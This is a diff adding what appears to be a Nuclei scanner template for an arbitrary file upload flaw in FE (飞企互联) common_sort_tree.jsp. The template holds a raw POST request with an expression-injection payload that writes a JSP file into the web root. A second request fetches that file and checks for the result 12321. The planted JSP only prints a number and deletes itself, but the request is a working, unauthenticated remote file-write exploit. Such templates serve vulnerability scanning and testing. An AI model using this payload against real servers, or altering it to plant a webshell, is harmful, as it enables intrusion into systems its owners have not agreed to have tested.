@@ -1,0 +1,30 @@
+id: fe-common-sort-tree-fileupload
+
+info:
+  name: 飞企互联FE common_sort_tree.jsp 任意文件上传
+  author: SleepingBag945
+  severity: critical
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+    - |
+        POST /common/common_sort_tree.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../web/fe.war/{{filename}}.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("{{base64("<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")}}"))%25}
+
+    - |
+        GET /{{filename}}.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"12321") && status_code == 200
